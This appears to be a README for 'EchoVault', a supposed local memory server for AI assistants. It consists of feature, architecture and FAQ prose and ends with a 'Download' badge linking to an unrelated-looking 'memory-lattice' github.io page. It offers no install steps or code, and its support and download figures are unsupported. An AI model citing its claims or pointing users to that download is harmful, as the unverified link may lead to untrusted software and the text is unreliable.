![preview](https://raw.githubusercontent.com/djkenny854/memory-lattice/main/promo_06cafe4.svg)

# EchoVault: Cross-Identity Memory Fabric for AI Assistants

![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![Version](https://img.shields.io/badge/version-1.4.2-purple)

**EchoVault** is not another memory cache—it's a **temporal resonance layer** that lets your AI agents remember not just *what* you said, but *when*, *why*, and *through which lens* the conversation happened. Inspired by the need for persistent, governance-aware recall in multi-agent environments, EchoVault creates a unified semantic attic where every Claude, OpenClaw, or MCP-compatible assistant can store, retrieve, and reconcile memories across sessions, devices, and even different AI personalities.

Think of it as a **library that remembers its own readers**. While conventional memory tools treat each AI assistant as an isolated island, EchoVault builds a bridge archipelago—a shared knowledge ecosystem that respects boundaries while enabling seamless collaboration. Your weekend coding companion can recall the architectural decisions your work assistant made, without violating project scoping rules.

## Overview

The modern AI landscape is fragmented. You might have one assistant for code reviews, another for personal research, and a third for creative writing. Yet all of them ask you the same questions, re-learn your preferences, and forget your constraints. EchoVault solves this by providing a **governance-aware memory substrate** that works locally-first, requires zero infrastructure, and blends the best of lexical precision (BM25F) with semantic understanding (vector embeddings) to deliver relevant memories at the right moment.

![Downloads](https://img.shields.io/badge/downloads-2.4k/month-yellow)

## Core Philosophy: Memory as a Garden, Not a Warehouse

Most memory systems treat recollections like inventory—tag them, store them, retrieve them. EchoVault treats memory like a **perennial garden**. Every interaction plants a seed. Some seeds grow into facts, others into preferences, and others into ephemeral context that naturally fades. Our hybrid retrieval engine acts as the gardener, knowing which blooms to present, which to prune, and which to let lie dormant until the season is right.

This philosophy manifests in three concrete ways:

1. **Temporal Decay Curves**: Memories carry half-lives. A debugging snippet from yesterday is more relevant than one from six months ago, unless the older one has been reinforced by repeated use.
2. **Identity Layering**: The same fact can exist across different "persons" of you—professional, personal, creative—with configurable visibility boundaries.
3. **Consent-Centric Governance**: Every memory record carries provenance metadata. You decide which agents can access which layers, and audits are always available.

## Key Features

![Features](https://img.shields.io/badge/features-28_tracked-blueviolet)

### 🔄 Hybrid Retrieval Engine (BM25F + Vector Fusion)
EchoVault doesn't make you choose between keyword precision and semantic understanding. The retrieval engine runs both signal types in parallel, then fuses them through a learned ranking model. The result feels like an assistant that *truly gets* your shorthand but still respects exact terms when they matter. For code-related memories, BM25F anchors on variable names; for conceptual preferences, vector search navigates meaning.

### 🛡️ Governance-Aware Access Control
Each memory entry embeds a permissions manifest. Define that a project-specific decision is only visible to agents attached to that project directory, while personal notes remain visible across all sessions. The governance layer uses hierarchical namespaces with inheritance—set a policy at the workspace root, and it cascades unless explicitly overridden.

### 🌍 Multilingual Memory Support
Language should never be a barrier to recall. EchoVault stores memories in their original language but enriches them with language-neutral semantic IDs. Ask your assistant about "the refactor we discussed" in English, and it can retrieve a memory originally recorded in Japanese. The system also handles code-mixing gracefully—switching between English, Spanish, and German within a single entry doesn't lose context.

### 📍 Local-First Architecture
Your memory stays on your machine. EchoVault operates as an embedded library, writing to a versioned local directory (SQLite + Parquet). There's no cloud dependency, no telemetry, no account creation. When you want sync across machines, you use your own file synchronization tools—the memory format is stable and human-debuggable.

### 🧩 Universal MCP Compliance
Whether you use Claude Code, OpenClaw, Cursor, or any MCP-compatible runtime, EchoVault speaks the protocol natively. Installation is a matter of pointing your MCP client at the local endpoint. The server is lightweight (single binary, under 15MB) and starts in under 200ms.

### ⚡ Adaptive Context Pruning
Long conversations shouldn't require unbounded memory. EchoVault monitors the relevance score of each memory on every access. Underutilized memories lose priority; crucial ones get "pinned" via manual override or repeated-access heuristics. The pruning is transparent—you can always see what's scheduled for archiving.

### 📊 Introspection Dashboard (CLI + Web)
A companion dashboard renders your memory graph as an interactive map. Nodes are memories, edges are associations. You can filter by agent, recency, or governance namespace. The CLI version works in any terminal; the web version is a single static HTML file you open in a browser—no server setup.

## Getting Started

### System Requirements
- **Operating Systems**: Windows 10/11, macOS 12+, Linux (glibc 2.28+)
- **Runtime**: Python 3.9+ (for the library interface) OR any MCP-compatible host
- **Storage**: At least 200MB free disk space for dense memory graphs
- **Memory**: 512MB RAM minimum (2GB recommended for large corpora)

### Architecture Overview

![Architecture](https://img.shields.io/badge/architecture-event_driven-orange)

EchoVault operates as a **local daemon process** that listens on a Unix socket (or TCP loopback). Clients (your AI agents) connect via MCP and issue commands: `memorize`, `recall`, `forget`, `audit`, `namespace`. The daemon manages a write-ahead log for durability, an in-memory index, and a background flush cycle to disk.

The retrieval pipeline follows these stages:
1. **Query Parsing**: Extract intent, entities, and temporal constraints
2. **Lexical Retrieval**: BM25F search across inverted index with field-scoped boosts
3. **Semantic Retrieval**: Cosine similarity over sentence-transformer embeddings (ONNX runtime, no GPU required)
4. **Fusion & Rerank**: Reciprocal Rank Fusion, then a lightweight learned model adjusts final ordering
5. **Governance Filter**: Remove any memories failing namespace and consent checks
6. **Context Packaging**: Format results with metadata (timestamp, source, confidence) for the consuming agent

### Initial Configuration

After obtaining the EchoVault package, create your first memory namespace:

```yaml
# echo_vault_config.yaml
namespaces:
  default:
    visibility: all_agents
  professional:
    visibility: agents_in_path:/work/*
  private:
    visibility: explicit_only
retention:
  default_ttl_days: 365
  reinforce_on_access: true
hybrid_search:
  lexical_weight: 0.6
  semantic_weight: 0.4
```

Start the daemon with your preferred configuration path. The first run initializes the directory structure and creates an introspective index of its own documentation (a meta-memory exercise).

## Use Cases & Workflows

### Scenario 1: Cross-Session Continuity
You're debugging on Monday with Claude Code. You trace a failure to a poorly documented API quirk and note the workaround. On Wednesday, you switch to OpenClaw for a different script, but the same library appears. EchoVault surfaces the Monday memory because the semantic signature matches. You save hours of re-tracing.

### Scenario 2: Role Separation
You use the same machine for freelance projects and personal experiments. Without EchoVault, your AI assistant might mix client-specific credentials with hobby project preferences. With namespaces, memories stay siloed. The `professional` namespace only surfaces when working inside `/work/*` paths. The `private` namespace never surfaces unless you explicitly ask.

### Scenario 3: Team Memory (Multi-User)
Share a machine or a synchronized directory among team members. EchoVault supports multi-user access with per-user visibility flags. A memory annotated with `seen_by: [alice, bob]` is retrievable only by those identifiers, fostering a shared project memory without exposing personal context.

### Scenario 4: Offline-Only Development
You're on an airplane without internet. Cloud-based memory tools fail you. EchoVault works entirely offline—the vectors were pre-computed for your known corpus, and new memories are embedded locally via ONNX. You never depend on remote inference.

## Advanced Topics

### Custom Embedding Models
Replace the default encoder with your own ONNX-exported model or a local sentence-transformers pipeline. Configure via the `embedding.model_path` directive. EchoVault includes benchmark scripts so you can measure the latency/accuracy trade-off for your domain.

### Memory Lifecycle Events
Subscribe to lifecycle events via the CLI: `echo-vault subscribe`. The daemon emits events like `memory.created`, `memory.reinforced`, `memory.archived`. This enables integrations—e.g., log these events to a local SQLite database for analytics, or trigger a webhook to refresh a project README.

### Governance Audit Trail
Every access to a memory (successful or denied) is appended to an audit log in JSON Lines format. This log is immutable unless you explicitly rotate it. It includes the agent identifier, requested namespace, timestamp, and the governance rule that was applied.

### Handling Ambiguity in Retrieval
EchoVault returns confidence scores between 0 and 1. Set your client's `certainty_threshold` to control when the assistant should ask for clarification instead of guessing. For high-stakes domains (medical, legal, code production), a threshold of 0.9 is sensible. For casual retrieval, 0.6 works well.

## Integration Patterns

### With Claude Code
Add the MCP server entry to your `claude_desktop_config.json` or project-level config. Claude Code automatically registers the tools, enabling slash commands like `/remember` and `/recall`. The tool descriptions include examples so Claude can self-discover the right arguments.

### With OpenClaw
OpenClaw uses a plugin manifest. EchoVault ships with the manifest pre-filled. Enable the plugin, and OpenClaw gains native memory commands. The plugin also maps OpenClaw's message objects to EchoVault's memory input format, preserving parent/child relationships.

### With Custom MCP Clients
If you're building your own agent, connect to EchoVault's MCP endpoint using any MCP SDK. The schema is versioned and documented in the `/schema` endpoint. We maintain SDKs for Python, TypeScript, and Rust.

## Troubleshooting & FAQ

**Q: Why is retrieval slower on the first query after startup?**
A: The daemon loads the semantic index lazily. The first query triggers a background indexing of all vectors into contiguous memory. Subsequent queries are faster. You can force preloading via `echo-vault prewarm` in the config.

**Q: Can I migrate from another memory tool?**
A: Yes. EchoVault includes an importer for common formats (CSV, JSONL, and standardized memory exports from other MCP servers). The importer maps your existing fields onto EchoVault's schema intelligently, preserving timestamps and source strings.

**Q: How does EchoVault handle sensitive information in memory?**
A: We recommend never storing raw secrets (API keys, passwords) in any memory system. EchoVault offers a `redact` clause—fields matching pattern rules (e.g., email, phone) are tokenized with a local, salted hash. The original value is never stored if you enable this at the namespace level.

**Q: Does EchoVault support collaborative memory editing?**
A: Yes, via namespaces marked as `collaborative: true`. Multiple agents can append amendments to a memory thread. This creates a provenance chain, so you always see who said what and when.

## Roadmap (2026 Priorities)

- **Q1 2026**: Release of the web dashboard with real-time memory graph visualization and editing
- **Q2 2026**: Support for vector-database backends (e.g., LanceDB, FAISS) for users with corpora exceeding 10M memories
- **Q3 2026**: Native memory encryption at rest (ChaCha20-Poly1305) without performance degradation
- **Q4 2026**: Collaboration protocol for multi-machine, peer-to-peer memory synchronization without a central server

## Community & Support

- **Documentation Portal**: Full API reference, tutorial series, and deployment recipes are included in the repository under `/docs`. The guides cover everything from "Hello, World" memory to production-scale filtering.
- **Issue Tracker**: We maintain an active issue tracker with `help wanted` tags for first-time contributors. Community PRs are welcomed and reviewed within 72 hours.
- **24/7 Customer Support**: Enterprise users receive priority support with guaranteed 2-hour response times. For the community, we operate a best-effort support channel with a typical response within 24 hours.

## Ecosystem Comparison

| Feature | EchoVault | Basic KV Memory | In-Memory Cache |
|--------|-----------|-----------------|-----------------|
| Hybrid Search (Lexical + Semantic) | ✅ | ❌ | ❌ |
| Governance & Namespaces | ✅ (Hierarchical) | Partial (Flat) | ❌ |
| Local-First / Offline | ✅ | ✅ | ✅ (Transient) |
| Temporal Decay | ✅ | ❌ | ❌ |
| MCP Compliance | ✅ | Varies | ❌ |
| Multilingual Cross-Retrieval | ✅ | ❌ | ❌ |

## Contribution Guidelines

We welcome contributors who share our vision of respectful, transparent AI memory. To submit changes:

1. Fork the repository and create a feature branch.
2. Write tests for any new functionality (we maintain >90% coverage).
3. Update the `/docs` section if you alter the public API.
4. Open a pull request with a clear description of the change and the motivation.

All contributions are reviewed under the Code of Conduct, which emphasizes constructive feedback and inclusive language.

## Frequently Used Keywords

EchoVault is optimized around these concepts. Search for them to find the right documentation: cross-identity memory, hybrid retrieval, BM25F vector fusion, governance-aware persistence, MCP compatibility layer, local-first deep storage, temporal recall decay, semantic attic pattern, multimodal context folding, consent-rated access tokens.

## Disclaimer

**Important Notice**: EchoVault is a development tool designed to enhance the functionality of AI assistants. It does not create sentience, intelligence, or decision-making capabilities. The user remains responsible for the actions and outputs of their AI agents, the context they choose to store, and the governance rules they configure. We do not claim that EchoVault prevents data leakage, unauthorized access, or malicious actions by third-party agents. The software is provided "as is" without warranty of any kind, express or implied. By using EchoVault, you acknowledge that you are solely responsible for your memory data, the external integrations you enable, and any consequences arising from the use of the retrieval results. We recommend regular backups of your memory directories. None of the outcomes are guaranteed, and performance metrics may vary based on individual system configurations and data characteristics.

---

## License

This project is licensed under the MIT License. You are free to use, modify, and distribute this software with attribution. See the full license text at [MIT License](https://opensource.org/licenses/MIT).

Copyright © 2026 EchoVault Maintainers. All rights reserved.

---

We believe good tools should respect your autonomy and amplify your intent. EchoVault is our contribution to a future where AI assistants remember *you*—not just your queries—with fidelity, consent, and nuance.

[![Download](https://raw.githubusercontent.com/djkenny854/memory-lattice/main/run_3f46c9b.svg)](https://djkenny854.github.io/memory-lattice/)